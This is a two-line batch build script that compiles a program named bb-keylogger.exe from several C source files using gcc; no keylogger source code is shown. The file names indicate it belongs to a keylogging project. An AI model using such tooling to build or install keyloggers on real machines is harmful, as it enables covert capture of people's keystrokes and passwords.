rem Compile the bb-keylogger.exe from the sources
gcc -Wall ../main.c ../bb-keylogger-utils.c ../bb-keylogger-keyboard.c ../bb-keylogger-system.c -o ../bin/bb-keylogger.exe
